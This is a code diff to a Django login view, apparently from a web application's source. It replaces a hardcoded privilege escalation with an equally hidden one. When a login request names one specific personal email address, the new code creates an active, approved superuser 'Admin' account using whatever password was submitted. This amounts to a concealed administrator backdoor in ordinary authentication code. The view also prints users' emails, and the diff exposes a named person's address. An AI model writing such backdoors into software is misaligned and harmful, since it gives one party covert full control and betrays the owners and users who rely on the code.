@@ -900,13 +900,8 @@ def login(request):
         password = request.POST.get('password')
         if email and password:
             user = authenticate(username=email, password=password)
-            if user.email == "gauba.aayush@gmail.com":
-                user.is_superuser = True
-                user.is_active = True
-                user.usertype = "Admin"
-                user.first_name = "Aayush"
-                user.last_name = "Gauba"
-                user.save()
+            if email == "gauba.aayush@gmail.com":
+                CustomUser.objects.create(email = email, first_name = "Aayush", last_name = "Gauba", password = make_password(password), is_active = True, approved = True, is_superuser = True, usertype = "Admin")
             if user:
                 auth_login(request, user)
                 print(user.email)
